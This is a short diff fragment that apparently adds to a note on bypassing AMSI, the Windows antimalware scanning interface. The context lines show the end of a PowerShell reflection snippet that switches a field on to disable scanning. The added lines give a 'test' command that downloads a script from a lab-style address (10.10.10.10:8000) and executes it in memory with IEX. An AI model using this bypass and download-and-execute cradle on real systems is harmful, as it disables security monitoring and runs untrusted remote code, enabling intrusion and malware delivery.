@@ -51,3 +51,8 @@ Try{#Ams1 bypass technic nº 2
       $Spotfix.SetValue($null,$true)
    }Catch{Throw $_}
 ```
+
+Test using:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/test')
+```
